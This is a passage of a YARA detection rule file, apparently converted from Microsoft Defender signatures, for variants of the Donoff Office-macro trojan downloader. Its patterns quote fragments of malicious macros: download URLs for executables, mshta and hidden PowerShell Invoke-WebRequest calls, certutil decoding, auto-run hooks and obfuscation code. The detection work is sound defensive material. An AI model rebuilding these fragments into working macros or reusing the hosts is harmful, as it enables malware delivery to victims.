        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://51.255.155.1/pages/filecloud/5e2d7b130cf4feb03023e580b3432fa9d71d7838.exe" ascii //weight: 1
        $x_1_2 = "Environ$(\"tmp/filename.exe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RBP_2147764610_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RBP!MTB"
        threat_id = "2147764610"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6c 6f 67 69 6e 2e 61 74 74 61 63 68 6d 65 6e 74 2d 74 65 73 74 31 32 2e 73 65 63 75 72 65 6c 79 2d 6c 6f 67 6f 75 74 2e 63 6f 6d 2f 61 70 69 2f 41 6e 61 6c 79 74 69 63 73 2f 4d 61 63 72 6f 3f 69 69 64 3d 66 66 65 31 37 65 33 34 2d 36 37 34 32 2d 34 30 38 30 2d 62 33 37 38 2d 38 34 36 63 63 35 39 65 34 66 35 62 6f 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "MyRequest.Open \"GET\", _" ascii //weight: 1
        $x_1_3 = "CreateObject(\"WinHttp.WinHttpRequest.5.1\")" ascii //weight: 1
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_5 = "MyRequest.Send" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_A_2147765095_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.A!MSR"
        threat_id = "2147765095"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set pwtrick = New WshShell" ascii //weight: 1
        $x_1_2 = "Set a = apldwine.CreateTextFile(\"C:\\Trase\\declarpaintblow.vbe\", True)" ascii //weight: 1
        $x_1_3 = "a.WriteLine (apdo.aposlcka)" ascii //weight: 1
        $x_1_4 = "pwtrick.Exec \"explorer C:\\Trase\\declarpaintblow.vbe\"" ascii //weight: 1
        $x_1_5 = "apldwine.CreateFolder (\"C:\\Trase\\Great\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RBQ_2147765132_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RBQ!MTB"
        threat_id = "2147765132"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6e 61 62 68 61 7a 65 6e 61 2e 6f 72 67 2f 63 6f 6e 74 65 6e 74 2f 73 6c 69 64 65 73 2f 69 6d 61 67 65 2f 61 70 70 2f 50 52 4f 4c 45 41 4b 2e 65 78 65 3a 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Start-Process -FilePath \"C:\\Users\\Public\\Documents\\jzwrxbhlc.exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_HDR_2147766096_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.HDR!MTB"
        threat_id = "2147766096"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 77 77 2e 79 65 73 66 6f 72 6d 2e 63 6f 6d 2f 61 63 74 69 76 65 2f 73 65 61 72 63 68 4d 65 73 73 65 6e 67 65 72 2f 75 70 64 61 74 65 32 2f 73 65 61 72 63 68 4d 65 73 73 65 6e 67 65 72 5f 75 70 67 72 61 64 65 5f 78 2e 65 78 65 53 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell \"C:\\sMessenger\\searchMessenger_upgrade_x.exe\"" ascii //weight: 1
        $x_1_3 = ".FolderExists(\"C:\\sMessenger\")" ascii //weight: 1
        $x_1_4 = "Kill DLocalFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_WP_2147766294_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.WP!MTB"
        threat_id = "2147766294"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (NaMmYpZmObFt)" ascii //weight: 1
        $x_1_2 = "QkDeAcBaGsUj = Chr(LnNrFbRcCmNc)" ascii //weight: 1
        $x_1_3 = "NaMmYpZmObFt = QkDeAcBaGsUj + PmOvQrKlXiDu + GiRxWkIzZiUb" ascii //weight: 1
        $x_1_4 = "CaMoMwUnAeXi = 282167275" ascii //weight: 1
        $x_1_5 = "LnNrFbRcCmNc = YoAkXgViPyIi - CaMoMwUnAeXi" ascii //weight: 1
        $x_1_6 = "BcChXjBtOhZr = 282167392" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RR_2147772030_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RR!MTB"
        threat_id = "2147772030"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "\"dcdv hgfn mjhgmj\"" ascii //weight: 2
        $x_2_2 = "\"bdhgf  bgfb 789\"" ascii //weight: 2
        $x_2_3 = "\"terg uyti gr dh jy fe\"" ascii //weight: 2
        $x_2_4 = "Left(pptName, InStr(pptName, \".\")) & \"pdf\"" ascii //weight: 2
        $x_2_5 = "InStr(descenders_list, Mid$(phrase, x, 1))" ascii //weight: 2
        $x_2_6 = "ActivePresentation.ExportAsFixedFormat PDFName" ascii //weight: 2
        $x_1_7 = ".Run(derykeqbqjrmopaxmmvpjzike, gdwoasdmjfsz)" ascii //weight: 1
        $x_1_8 = ".Run(poeavdgiljitfoztzmkhllzvamkoh, bybupsb)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((6 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_SMI_2147773721_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SMI!MTB"
        threat_id = "2147773721"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set FSO = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = {46 53 4f 2e 43 6f 70 79 46 69 6c 65 20 [0-6] 2c 20 [0-6] 2c 20 31}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 [0-7] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_4 = "As New Shell32.Shell" ascii //weight: 1
        $x_1_5 = {43 61 6c 6c 20 [0-7] 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 28 [0-7] 2c 20 [0-7] 2c 20 22 20 22 2c 20 53 57 5f 48 49 44 45 29}  //weight: 1, accuracy: Low
        $x_1_6 = "(frm.payload.text)" ascii //weight: 1
        $x_1_7 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 [0-7] 22 2c 20 [0-6] 2c 20 [0-6] 20 26 20 22 6d 61 74 20 3a 20 22 22 22 20 26 20 [0-6] 20 26 20 22 22 22 22}  //weight: 1, accuracy: Low
        $x_3_8 = "= Split(aWYJj(frm.paths.text), \"|\")" ascii //weight: 3
        $x_3_9 = "Split(au6vsT(frm.paths.text), \"|\")" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 7 of ($x_1_*))) or
            ((2 of ($x_3_*) and 4 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147775348_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MTX!MTB"
        threat_id = "2147775348"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTX: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {66 20 3d 20 78 73 61 64 77 71 64 77 71 64 28 [0-15] 29}  //weight: 2, accuracy: Low
        $x_2_2 = "Shell f" ascii //weight: 2
        $x_2_3 = "xsadwqdwqd = strInput" ascii //weight: 2
        $x_2_4 = "Workbook_Open()" ascii //weight: 2
        $x_2_5 = "sadsad" ascii //weight: 2
        $x_2_6 = "Mid(strInput, i, 1) = Chr(Asc(Mid(strInput, i, 1)) - n)" ascii //weight: 2
        $x_2_7 = "LyBjXFQKcDbACGt = LyBjXFQKcDbACGt + \"p\"" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147775350_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MTZ!MTB"
        threat_id = "2147775350"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTZ: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {66 20 3d 20 78 73 61 64 77 71 64 77 71 64 28 [0-15] 29}  //weight: 2, accuracy: Low
        $x_2_2 = "Shell f" ascii //weight: 2
        $x_2_3 = "xsadwqdwqd = strInput" ascii //weight: 2
        $x_2_4 = "Workbook_Open()" ascii //weight: 2
        $x_2_5 = "sadsad" ascii //weight: 2
        $x_2_6 = "Mid(strInput, i, 1) = Chr(Asc(Mid(strInput, i, 1)) - n)" ascii //weight: 2
        $x_2_7 = "dPDQnAbZPRGiSaX = dPDQnAbZPRGiSaX + \"p\"" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXM_2147775430_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXM!MTB"
        threat_id = "2147775430"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "psowerss = \"powers\"" ascii //weight: 1
        $x_1_2 = "she = \"shel\"" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Outlook.Application\")" ascii //weight: 1
        $x_1_4 = "sease = \"Hidde\"" ascii //weight: 1
        $x_1_5 = "CreateObject(\"wscript.\" & she & \"l\")." ascii //weight: 1
        $x_1_6 = "exec(psowerss & \"hell -w \" & sease & \"n Invoke-WebRequest -Uri \" &" ascii //weight: 1
        $x_1_7 = {43 68 72 28 33 34 29 20 26 20 22 68 74 74 70 3a 2f 2f 73 63 61 6c 61 64 65 76 65 6c 6f 70 6d 65 6e 74 73 2e 73 63 61 6c 61 64 65 76 63 6f 2e 63 6f 6d 2f [0-17] 2e 65 78 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DR_2147775682_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DR!MTB"
        threat_id = "2147775682"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 69 74 68 75 62 2e 63 6f 6d 2f 44 33 56 49 35 48 34 2f 46 4c 41 4d 45 53 2f 62 6c 6f 62 2f 6d 61 69 6e 2f 44 61 74 61 25 32 30 45 78 66 69 6c 74 72 61 74 6f 72 2e 65 78 65 22 44 00 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Desktop\" & Application.PathSeparator &" ascii //weight: 1
        $x_1_3 = "file.exe\"" ascii //weight: 1
        $x_1_4 = ".Open \"GET\", myURL, False" ascii //weight: 1
        $x_1_5 = "WinHttpReq.Send" ascii //weight: 1
        $x_1_6 = "Shell(\"C:\\WINDOWS\\NOTEPAD.EXE\", 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DR_2147775682_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DR!MTB"
        threat_id = "2147775682"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "zfloxuacziuyvfggcfihlhrhwwnjppmilmiqeenzzlnnjezkjolkrcirpeilixdaomfbugdzhfvmktmniiqqkirvkrjmxysmugjk" ascii //weight: 1
        $x_1_2 = "-esqbfafgaiaagacgatgblahcalqbpagiaagblagmadaagae4azqb0ac4avwblagiaqwbsagkazqbuahqakqauaeqabwb3ag4ababvageazabtahqacgbpag4azwauaekabgb2ag8aawblacg" ascii //weight: 1
        $x_1_3 = "jazyrwqykhzrhiypyfqqfdxdjfzjczlbruswpvncqcufkhlsziedwynrjighopabvcqpcrqpgtqkuuxwcibfjuvbiiseiofjsokchojhizbvyibpdfxqdvijmewflbwykpubhmddkiyvpml" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RV_2147775699_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RV!MTB"
        threat_id = "2147775699"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (\"C:\\\\Windows\\\\System32\\\\cmd.exe /c certutil -decode B:\\Hack\\Office\\eviloffice\\emay.txt" ascii //weight: 1
        $x_1_2 = {42 3a 5c 48 61 63 6b 5c 4f 66 66 69 63 65 5c 65 76 69 6c 6f 66 66 69 63 65 5c 65 6d 61 79 2e 65 78 65 22 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: High
        $x_1_3 = "Sub Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXO_2147775982_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXO!MTB"
        threat_id = "2147775982"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "K = \"j.mp/\"" ascii //weight: 1
        $x_1_2 = "T = \"huidywqudbjhvcfgjdagshdj\"" ascii //weight: 1
        $x_1_3 = "L = \"p\"" ascii //weight: 1
        $x_1_4 = "F = \" H\" + D + D + L + \"://\" + K + T" ascii //weight: 1
        $x_1_5 = "pings = X + Y + Z + D + E + F" ascii //weight: 1
        $x_1_6 = "meinkonhun = GetObject(\"\" + \"n\" + \"e\" + \"w\" + \":\" + \"F93\" + \"5\" + \"D\" + \"C\" + \"2\" + \"2\" + \"-\" + \"1\" + \"C\" + \"F\"" ascii //weight: 1
        $x_1_7 = "meinkonhun.EXEC pings" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXI_2147776029_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXI!MTB"
        threat_id = "2147776029"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "= \"^owershell.exe" ascii //weight: 2
        $x_2_2 = "$t=[System.Text.Encoding]::ASCII.GetString($Mo)|IEX" ascii //weight: 2
        $x_2_3 = {6d 69 7a 20 3d 20 52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 5e 22 2c 20 22 50 22 29}  //weight: 2, accuracy: Low
        $x_2_4 = "= GetObject(\"new:72\" & MMM)" ascii //weight: 2
        $x_2_5 = "Run s & miz, Sin(0.1)" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXI_2147776029_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXI!MTB"
        threat_id = "2147776029"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "CreateObject(\"microsoft.xmlhttp\")" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_4 = "SaveToFile SOL, POL + POL" ascii //weight: 1
        $x_1_5 = "CreateObject(\"adodb.stream\")" ascii //weight: 1
        $x_1_6 = "WshShell.SpecialFolders(\"Nethood\")" ascii //weight: 1
        $x_1_7 = "Status = 200 Then" ascii //weight: 1
        $x_1_8 = "GjggvhGjfdjkKds()" ascii //weight: 1
        $x_1_9 = "As String = \"zebrascdfghijklmnopqtuvwxy\"" ascii //weight: 1
        $x_1_10 = "As String = \"ZEBRASCDFGHIJKLMNOPQTUVWXY\"" ascii //weight: 1
        $x_1_11 = "VbGJdjddhguks(0)" ascii //weight: 1
        $x_1_12 = "LHlygytrdytddrXytrUdr(0)" ascii //weight: 1
        $x_1_13 = "BHJcfhdfgGYdufYuf(0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "htt`ps://vers778ve29.com/petalo.j`pg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Add \"MsHt\"" ascii //weight: 1
        $x_1_2 = ".Add \"a http://\"" ascii //weight: 1
        $x_1_3 = ".Add \"bitly.com/asdkjasdhsudiqowiudqw\"" ascii //weight: 1
        $x_1_4 = "obj.MainCallex (dd1 + dd2 + dd3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "X = \"mshta" ascii //weight: 1
        $x_1_2 = "X = \"mshta.e`x`e \"" ascii //weight: 1
        $x_1_3 = "Y = \"https://www.bitly.com/\"" ascii //weight: 1
        $x_1_4 = {5a 20 3d 20 22 [0-170] 22}  //weight: 1, accuracy: Low
        $x_1_5 = "Debug.Print (Shell(X + Y + Z))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ncb = \"vbxcb bnvbcv czxc vxcbvxcb\"" ascii //weight: 1
        $x_1_2 = "vxcxb = \"vxcb bxcb cbvcxb\"" ascii //weight: 1
        $x_1_3 = "xcvbvxc = \"vxvbv cxfgh cbcn bncvbnsdgg 4t4rt c fgsgb\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "X = \"mshta.exe \"" ascii //weight: 1
        $x_1_2 = "Y = \"https://www.bitly.com/\"" ascii //weight: 1
        $x_1_3 = "Z = \"kddjkdwokddwodkwodki\"" ascii //weight: 1
        $x_1_4 = "Debug.Print (Shell(X + Y + Z))" ascii //weight: 1
        $x_1_5 = "Auto_Open" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fjiorr = \"h\" & \"e\" & \"l\" & \"l\"" ascii //weight: 1
        $x_1_2 = "EUrxrXO = \"S\" & fjiorr" ascii //weight: 1
        $x_1_3 = "aHiMN = \"W\" & \"S\" & \"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii //weight: 1
        $x_1_4 = "bbwtpTVV = aHiMN & \".\" & EUrxrXO" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ioyukiu = Chr(cdssf - 116)" ascii //weight: 1
        $x_1_2 = "PDFName = Left(pptName, InStr(pptName, \".\")) & \"pdf\"" ascii //weight: 1
        $x_1_3 = "= \"bdhgf  bgfb 789" ascii //weight: 1
        $x_1_4 = "terg uyti gr dh jy fe" ascii //weight: 1
        $x_1_5 = "WSCript.shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sdfxc = \"bvcvhgj  cvnvcfh cvnvhgk\"" ascii //weight: 1
        $x_1_2 = "ljknmn = Chr(ophji - 130)" ascii //weight: 1
        $x_1_3 = "vcxbdg = \"vxvbxdfg cxfgh vcvn gfgh ,vbnvc cvcvn\"" ascii //weight: 1
        $x_1_4 = "fdsaf = \"cxvx cbbcvx vcxzvsdf fdasxcv\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SM_2147776531_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SM!MTB"
        threat_id = "2147776531"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "slBGr = \"jira.txt" ascii //weight: 1
        $x_1_2 = "CbEWmOd.CreateObject(\"WScript.Shell\").Run (\"c\" & \"s\" & \"c\" & \"r\" & \"i\" & \"p\" & \"t\" & \" //E:jscript \" & vBPsTOI), 0" ascii //weight: 1
        $x_1_3 = "TGzlbCA.SaveToFile slBGr, 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
